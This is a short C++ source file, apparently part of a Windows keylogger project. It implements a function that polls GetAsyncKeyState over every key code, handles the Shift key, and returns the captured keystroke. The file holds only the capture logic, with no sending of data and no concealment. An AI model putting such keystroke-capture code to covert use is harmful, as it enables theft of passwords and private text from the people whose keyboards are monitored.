#include "keyLogger.h"

/*
A function that checks if a key was pressed and returns it's data.
Input: None.
Output: Instance of the keyStroke class, containing the key stroke's data.
*/

keyStroke keyLogger::checkPressedKey()
{
    int keyStat = 0;    // Can be 0 if not pressed, 0x1 if pressed and 0x8000 if held.
    char keyChar = 0;   // Printable character.
    int keyCode = 0;    // Virtual key code.
    bool printable = false;
    bool shifted = false;

    for (int i = 0; i < NUM_OF_KEYS; i++)
    {
        keyStat = GetAsyncKeyState(i);
        

        // Check if a key was pressed with Shift.
        if ((keyStat & 0x1) && GetAsyncKeyState(VK_SHIFT) && i != VK_SHIFT && i != VK_RSHIFT && i != VK_LSHIFT)
        {
            // Get the actual char.
            shifted = true;
            keyChar = MapVirtualKeyA(i, MAPVK_VK_TO_CHAR);
            keyChar = keyProcessor::formatShiftedKeys(keyChar);

            // Getting the virtual key code.
            keyCode = i;
            i = NUM_OF_KEYS;    // Stopping the loop.
        }
        else if (keyStat & 0x1) // Check if a key was pressed without Shift.
        {
            keyChar = MapVirtualKeyA(i, MAPVK_VK_TO_CHAR);
            // Letters are capital by default, convert them to lower case.
            if (keyChar >= 'A' && keyChar <= 'Z')   
                keyChar = keyProcessor::convertToLowerCase(keyChar);

            keyCode = i;

            i = NUM_OF_KEYS;    // Stopping the loop.
        }

    }

    // Set the printable property for printable characters.
    if (keyProcessor::filterPrintableChar(keyChar))
        printable = true;

    return keyStroke(printable, shifted, keyChar, keyCode);
}
